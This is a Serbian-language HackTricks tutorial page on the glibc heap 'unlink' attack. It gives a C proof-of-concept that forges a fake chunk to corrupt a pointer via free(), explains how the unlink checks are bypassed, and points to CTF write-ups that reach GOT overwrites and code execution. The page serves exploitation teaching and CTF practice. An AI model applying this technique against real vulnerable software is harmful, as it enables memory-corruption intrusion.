# Unlink Napad

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Osnovne informacije

Kada je ovaj napad otkriven, uglavnom je omogućavao WWW (Write What Where), međutim, neka **proveravanja su dodata** čineći novu verziju napada interesantnijom i kompleksnijom i **beskorisnom**.

### Primer koda:

<details>

<summary>Kod</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* Napad ne funkcioniše ako se koriste tcaches (nakon 2.26)

### Cilj

Ovaj napad omogućava **promenu pokazivača na blok tako da pokazuje na 3 adrese pre sebe**. Ako se na ovom novom mestu (okolina gde je pokazivač bio smešten) nalaze zanimljive stvari, poput drugih kontrolisanih alokacija / steka..., moguće je čitati/prepisivati ih kako bi se prouzrokovala veća šteta.

* Ako je ovaj pokazivač bio smešten u steku, jer sada pokazuje 3 adrese pre sebe i korisnik potencijalno može da ga pročita i izmeni, biće moguće procureti osetljive informacije iz steka ili čak izmeniti povratnu adresu (možda) bez dodirivanja kanara
* U CTF primerima, ovaj pokazivač se nalazi u nizu pokazivača na druge alokacije, stoga, čineći ga da pokazuje 3 adrese pre i mogući za čitanje i pisanje, moguće je naterati druge pokazivače da pokazuju na druge adrese.\
Pošto korisnik potencijalno može čitati/pisati i druge alokacije, može procureti informacije ili prepisati nove adrese na proizvoljnim mestima (kao u GOT).

### Zahtevi

* Određena kontrola nad memorijom (npr. stek) kako bi se kreirali par blokova dajući vrednosti nekim od atributa.
* Procurenje steka kako bi se postavili pokazivači lažnog bloka.

### Napad

* Postoje par blokova (blok1 i blok2)
* Napadač kontroliše sadržaj bloka1 i zaglavlja bloka2.
* U bloku1 napadač kreira strukturu lažnog bloka:
* Da bi zaobišao zaštitu, osigurava da je polje `size` ispravno postavljeno kako bi izbegao grešku: `corrupted size vs. prev_size while consolidating`
* i polja `fd` i `bk` lažnog bloka pokazuju na mesto gde je smešten pokazivač bloka1 sa ofsetima -3 i -2, tako da `fake_chunk->fd->bk` i `fake_chunk->bk->fd` pokazuju na poziciju u memoriji (steku) gde se zaista nalazi adresa bloka1:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* Zaglavlja bloka2 se menjaju kako bi se naznačilo da prethodni blok nije korišćen i da je veličina veličina lažnog bloka koji sadrži.
* Kada se drugi blok oslobodi, tada se dešava odvajanje ovog lažnog bloka:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* Prethodno je napravljeno da `fake_chunk->fd->bk` i `fake_chunk->bk->fd` pokazuju na isto mesto (lokacija u steku gde je smešten `blok1`, tako da je to bila validna povezana lista). Pošto **oboje pokazuju na istu lokaciju**, samo poslednje (`fake_chunk->bk->fd = fake_chunk->fd`) će imati **efekat**.
* Ovo će **prepistati pokazivač na blok1 u steku na adresu (ili bajtove) smeštene 3 adrese pre u steku**.
* Stoga, ako napadač može ponovo kontrolisati sadržaj bloka1, biće u mogućnosti **pisati unutar steka**, moguće je potencijalno prepisati povratnu adresu preskačući kanar i izmeniti vrednosti i pokazivače lokalnih promenljivih. Čak ponovno izmeniti adresu bloka1 smeštenu u steku na drugu lokaciju gde ako napadač ponovo može kontrolisati sadržaj bloka1, biće u mogućnosti pisati bilo gde.
* Imajte na umu da je ovo bilo moguće jer su **adrese smeštene u steku**. Rizik i eksploatacija mogu zavisiti o **gde su adrese lažnog bloka smeštene**.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## Reference

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* Iako bi bilo čudno pronaći unlink napad čak i u CTF-u, ovde imate neke writeup-ove gde je ovaj napad korišćen:
* Primer CTF-a: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* U ovom primeru, umesto steka postoji niz malloc adresa. Unlink napad se izvodi kako bi se mogao alocirati blok ovde, stoga je moguće kontrolisati pokazivače niza malloc adresa. Zatim, postoji još jedna funkcionalnost koja omogućava modifikaciju sadržaja blokova na ovim adresama, što omogućava usmeravanje adresa ka GOT-u, modifikaciju adresa funkcija za dobijanje procuretaka i RCE.
* Još jedan primer CTF-a: [https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html)
* Kao i u prethodnom primeru, postoji niz adresa alokacija. Moguće je izvesti unlink napad kako bi se adresa prve alokacije usmerila na nekoliko pozicija pre početka niza i zatim prepisati ovu alokaciju na novu poziciju. Stoga je moguće prepisati pokazivače drugih alokacija da pokazuju na GOT atoi, ispisati ga da bi se dobio procuretak libc-a, a zatim prepisati atoi GOT sa adresom do jednog gedžeta.
* Primer CTF-a sa prilagođenim malloc i free funkcijama koje zloupotrebljavaju ranjivost veoma sličnu unlink napadu: [https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html)
* Postoji prekoračenje koje omogućava kontrolu FD i BK pokazivača prilagođenog malloc-a koji će biti (prilagođeno) oslobođen. Osim toga, heap ima exec bit, tako da je moguće procureti adresu heap-a i usmeriti funkciju iz GOT-a ka heap bloku sa shellkodom za izvršavanje.
